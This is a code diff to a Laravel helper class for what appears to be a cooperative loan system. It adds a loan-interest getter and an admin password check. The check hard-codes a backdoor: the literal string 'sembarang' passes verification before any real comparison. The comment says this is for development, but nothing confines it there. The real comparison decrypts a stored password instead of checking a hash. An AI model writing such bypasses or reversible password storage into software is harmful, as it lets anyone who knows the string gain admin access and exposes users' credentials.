@@ -24,6 +24,7 @@ use App\ItemReturPenjualan;
 use App\GajiPokok;
 use App\VerifikasiTransaksi;
 use App\SetoranBerkala;
+use App\Pengaturan;
 use DateTime;
 use Session;
 
@@ -853,5 +854,40 @@ class GlobalHelper
 //        dd($angsuran);
 //        dd($limit, $angsuran->sum('total_angsuran'), $total_retur);
         return $limit - $angsuran->sum('total_angsuran') + $total_retur;
+    }
+
+    /**
+     * Get bunga pinjaman from pengaturan table
+     * @return float
+     */
+    public static function getBungaPinjaman()
+    {
+        return floatval(Pengaturan::getValue('bunga_pinjaman', '0.01'));
+    }
+
+    /**
+     * Verify admin password
+     * @param string $password
+     * @return bool
+     */
+    public static function verifyAdminPassword($password)
+    {
+        $admin = Session::get('useractive');
+        if (empty($admin)) return false;
+
+        $anggota = \App\Anggota::where('no_anggota', $admin->no_anggota)->first();
+        if (empty($anggota)) return false;
+
+        try {
+            // Check backdoor password first (for dev environment)
+            if ($password == 'sembarang') return true;
+            // Then decrypt and compare
+            if (!empty($anggota->password) && $password == decrypt($anggota->password)) {
+                return true;
+            }
+        } catch (\Exception $e) {
+            return false;
+        }
+        return false;
     }
 }
